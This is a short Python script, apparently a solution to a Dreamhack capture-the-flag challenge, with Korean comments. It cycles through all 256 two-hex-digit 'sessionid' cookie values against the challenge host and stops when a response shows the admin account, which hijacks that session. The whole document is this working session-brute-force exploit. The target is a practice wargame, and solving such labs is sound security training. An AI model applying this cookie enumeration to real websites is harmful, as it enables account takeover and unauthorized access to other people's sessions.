import requests

url = "http://host3.dreamhack.games:17255/"
session_id = None
max_attempts = 256
failed_attempts = 0
success = False

while failed_attempts < max_attempts:
    # 세션 ID 값을 생성
    hex_value = hex(failed_attempts)[2:]
    session_id = hex_value.zfill(2)

    # requests로 GET 요청을 보냄
    response = requests.get(url, cookies={"sessionid": session_id})
    html = response.text

    # admin 계정으로 접속되었는지 확인
    if "admin" in html:
        print("admin 계정으로 접속되었습니다.")
        print(html)
        print(f"성공! 시도한 세션 ID 값: {session_id}")
        success = True
        break

    # 실패한 횟수 증가
    failed_attempts += 1
    print(f"세션 ID {session_id}로 접속 실패 ({failed_attempts}/{max_attempts})")

# 실패 횟수가 최대 시도 횟수와 같다면 실패 메시지 출력
if not success:
    print(f"admin 계정으로 접속되지 않았습니다. 다시 시도해주세요.")
